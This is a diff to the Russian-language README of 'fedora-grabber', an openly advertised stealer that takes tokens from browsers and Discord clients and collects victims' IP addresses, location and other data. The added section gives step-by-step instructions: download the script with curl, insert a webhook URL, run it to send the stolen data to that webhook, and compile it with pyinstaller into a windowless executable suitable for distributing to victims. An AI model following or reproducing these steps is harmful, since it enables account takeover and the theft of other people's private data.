@@ -14,5 +14,31 @@
 - [x] Стаскивает токены с браузеров и клиентов Discord.
 - [x] Получает IP клиента, точную (нет) геолокацию и ещё ОЧЕНЬ. МНОГО. ИНФОРМАЦИИ.
 # Минусы
-- [x] Требуется библиотеки "re", "getpass", "requests", "discord", "platform", "datetime"
+- [x] Требуется библиотеки "`re`", "`getpass`", "`requests`", "`discord`", "`platform`", "`datetime`"
 - [x] Много не очень понятного кода (может вы и поймёте :))
+# Установка
+Откройте терминал/"cmd" (так в виндах называется)
+
+и пропишите / [копи-пастните](https://www.google.com/search?q=Вырезать,+копировать,+вставить&client=Amog+OS) эти команды:
+```bash
+curl https://raw.githubusercontent.com/EZRAIDv2/fedora-grabber/main/src/fedora-grabber.py?token=GHSAT0AAAAAABR357CFMB6RA5NHBAFT3H4CYQWEJRA > fedora-grabber.py
+```
+Перед прописыванием следующей команды отредактируйте файл так, чтобы в начале было написан URL вебхука.
+
+Пример: ``
+
+Теперь идём дальше.
+```bash
+python3 fedora-grabber.py
+```
+Готово! Вы отправили информацию на вебхук.
+
+Вы можете скомпилировать скрипт при помощи `pyinstaller`:
+```bash
+pip install pyinstaller
+pyinstaller --onefile --noconsole fedora-grabber.py
+```
+
+Готово, вы скомпилировали скрипт в "`.exe`" или в эльф-файл или ещё что-то,
+
+смотря какая у вас платформа.
